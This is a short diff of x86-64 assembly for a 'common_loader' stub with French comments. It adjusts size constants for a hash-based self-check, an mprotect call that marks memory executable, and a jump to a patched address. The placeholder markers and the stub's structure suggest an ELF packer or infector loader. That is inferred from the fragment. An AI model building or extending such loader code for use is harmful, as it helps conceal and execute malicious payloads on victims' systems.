@@ -33,7 +33,7 @@ common_loader:
 	pushfq
 	mov edi, 5381
 	mov r13d, edi ;hash bis
-	mov rdx, 0xc5; c5 ;size LOADER a modifier
+	mov rdx, 0x10; c5 ;size LOADER a modifier
 	mov rsi, 0 ;inc
 	lea rcx, [loader] ;adresse syscalls
 	pop rax; verif step by step
@@ -58,7 +58,7 @@ hash_loop2:
 	cmp rsi, rdx
 	jl hash_loop1
 	mov rdx, 0x7 ;EXEC | READ ; syscalls
-	mov rsi, 0x3954;|REPLACE1| size bis + payload + 1 page ; syscalls
+	mov rsi, 0x3953;|REPLACE1| size bis + payload + 1 page ; syscalls
 	lea rdi, [pos_rdi] ; adresse bis ; syscalls
 pos_rdi:
 	mov r14, 0x12345678
@@ -69,7 +69,7 @@ pos_rdi:
 	and rdi, 0xFFFFFFFFFFFFF000 ; syscalls
 	mov rax, 0xa ; syscalls
 	syscall ; syscalls
-	add rbx, 0x1d8;|REPLACE2| BIS_SIZE
+	add rbx, 0x1d7;|REPLACE2| BIS_SIZE
 	jmp r15
 	index dd 0x41414141
 	lol db 0
